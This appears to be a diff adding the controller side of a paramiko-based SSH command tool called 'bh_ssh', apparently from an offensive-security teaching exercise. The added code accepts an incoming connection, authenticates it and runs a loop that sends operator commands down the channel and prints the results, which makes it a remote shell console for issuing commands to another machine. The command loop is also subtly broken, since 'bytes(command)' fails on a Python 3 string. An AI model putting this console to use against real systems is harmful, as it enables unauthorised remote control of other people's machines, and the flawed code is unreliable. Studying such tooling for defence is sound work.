@@ -37,3 +37,31 @@ if __name__ == '__main__':
         sys.exit()
     else:
         print(f'[+] Got a connection! {client}:{addr}')
+
+    bhSession = paramiko.Transport(client)
+    bhSession.add_server_key(HOSTKEY)
+    server = Server()
+    bhSession.start_server(server=server)
+
+    chan = bhSession.accept(20)
+    if chan is None:
+        print('*** No channel.')
+        sys.exit(1)
+
+    print('[+] Authenticated!')
+    print(chan.recv(1024))
+    chan.send(b'Welcome to bh_ssh')
+    try:
+        while True:
+            command = input("Enter command: ")
+            if command != "exit":
+                chan.send(bytes(command))
+                r = chan.recv(8192)
+                print(r.decode())
+            else:
+                chan.send(b'exit')
+                print('exiting')
+                bhSession.close()
+                break
+    except KeyboardInterrupt:
+        bhSession.close()
